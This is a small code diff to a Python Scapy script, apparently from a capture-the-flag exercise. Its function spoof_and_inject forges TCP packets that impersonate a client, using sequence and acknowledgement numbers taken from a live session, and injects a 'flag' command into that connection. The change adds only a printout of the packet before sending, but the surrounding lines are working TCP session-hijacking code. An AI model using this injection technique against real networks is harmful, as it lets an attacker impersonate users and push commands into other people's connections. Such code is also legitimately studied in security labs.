@@ -3049,8 +3049,11 @@ def spoof_and_inject(pkt):
         spoof_ip = IP(src=CLIENT_IP, dst=SERVER_IP)
         spoof_tcp = TCP(sport=tcp.dport, dport=tcp.sport, seq=tcp.ack, ack=ack, flags='PA')
 
-        # Send 'flag' instead of 'echo' + message
-        send(spoof_ip / spoof_tcp / MESSAGE, iface=INTERFACE, verbose=0)
+        payload = spoof_ip / spoof_tcp / MESSAGE
+        print("[+] Spoofed packet to be sent:")
+        payload.show()  # Show packet details before sending
+
+        send(payload, iface=INTERFACE, verbose=0)
         print(f"[+] Sent spoofed 'flag' command as client")
 
         sent = True
